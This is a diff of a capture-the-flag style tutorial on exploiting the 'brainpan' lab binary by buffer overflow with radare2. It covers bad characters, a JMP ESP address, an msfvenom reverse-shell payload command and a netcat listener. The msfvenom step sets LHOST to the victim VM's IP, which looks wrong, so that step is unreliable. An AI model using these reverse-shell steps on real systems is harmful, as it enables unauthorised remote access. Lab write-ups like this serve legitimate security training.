@@ -32,6 +32,9 @@ In your Windows VM, press ctrl + shift + esc to bring up the Task Manager. Go to
 
 Keep the Task Manager available. Anytime we close and re-open brainpan during debugging, we'll need to look up this PID since it will change.
 
+#### 4.5) File protections
+If you're interested in checking a binary for file protections but don't want to leave the command line, try the `checksec <binary>` command in Linux, or [winchecksec](https://github.com/trailofbits/winchecksec) for Windows.
+
 ### The good part
 
 #### 5) Debugging
@@ -163,7 +166,7 @@ We send a long string with a bunch of As, followed by 4 Bs, followed by a bunch 
 
 EIP is filled with the only 4 Bs (0x42 in ASCII) in our input string, proving that we control precisely the 4 bytes that will control EIP.
 
-### 7) Identify a usable JMP ESP instruction
+#### 7) Identify a usable JMP ESP instruction
 Great! Now we need to find a JMP ESP instruction in our binary, somewhere that we can exploit, so that we can redirect the execution flow of our program.
 
 Restart brainpan and reattach radare2, then run `is` to list all the symbols.
@@ -190,4 +193,49 @@ In the screenshot above, I've pointed out the columns of one instruction in part
 
 Since our binary is 32-bit, it will use little-endian notation. So, we'll write each hex character in our new JMP ESP address in reverse, so that the instruction gets interpreted properly: `\xf3\x12\x17\x31`. We'll need this address shortly.
 
-### 8) Bad Characters
+#### 8) Bad Characters
+
+Restart brainpan, and re-attach radare2. In your Linux VM, don't run `brainpan3.py` just yet. Instead, open it up in a text editor, and add `\x00` to the start of the badchars string, so that your file looks like this:
+
+![bc](https://user-images.githubusercontent.com/5056836/121802585-58fa6700-cbfa-11eb-81b2-8e388a6150d0.PNG)
+
+We're doing this to see what happens when a bad character exists in our input string. Also take note of the way the buffer at the end of the script is constructed:
+
+![bc1](https://user-images.githubusercontent.com/5056836/121802638-8c3cf600-cbfa-11eb-93c2-2708bec46e04.PNG)
+
+A bunch of "A"s and "B"s followed by our badchars string. Save the file, then execute ` $ python2 brainpan3.py <YOUR_WINDOWS_VM_IP> 9999`. In our Windows VM, we see that only the "A"s and "B"s came in, but nothing after that:
+
+![bp31](https://user-images.githubusercontent.com/5056836/121802673-cf976480-cbfa-11eb-8eaa-c0e5c60d78c6.PNG)
+
+Interesting. The character we inserted, `\x00`, is a null byte and a bad character. Go back into brainpan3.py and take that character back out, so that the file is in its original state. Run the experiment again, and notice in the Windows VM:
+
+![b32](https://user-images.githubusercontent.com/5056836/121801994-74b03e00-cbf7-11eb-993f-e508e38e6bfb.PNG)
+
+We can see the buffer full of potential bad characters come in. The last character in our badchars buffer, `\xff`, appears as a white square in our output. So, we know `\x00` was the only bad character.
+
+#### 9) Shell Code
+
+In our Linux VM, we'll run the following, substituting our Windows IP in:
+
+`msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_WINDOWS_VM_IP> LPORT=4444 -a x86 -b "\x00" -f python`
+
+This will output a long string of hex characters. Copy this string to your clipboard.
+
+![ms](https://user-images.githubusercontent.com/5056836/121802944-4c770e00-cbfc-11eb-8acb-da6565991efd.PNG)
+
+Open `brainpan5.py` in a text editor and replace the "buf" lines in this script with the ones in your clipboard, so that the shellcode contains the right IP and port number. Note that `brainpan4.py` is for Windows attack machines, so we're using `brainpan5.py` here.
+
+Save the file. Open a netcat listener on the LPORT from our msfvenom command:
+
+```
+ $ nc -nvl 4444
+ Listening on 0.0.0.0 4444
+```
+
+And run ` $ python2 brainpan5.py <YOUR_WINDOWS_VM_IP> 9999`. 
+
+![c](https://user-images.githubusercontent.com/5056836/121803761-3b300080-cc00-11eb-99ef-b4f348c187af.PNG)
+
+Viola! You have established a reverse shell via a buffer overflow vulnerability, exploited with radare2!
+
+
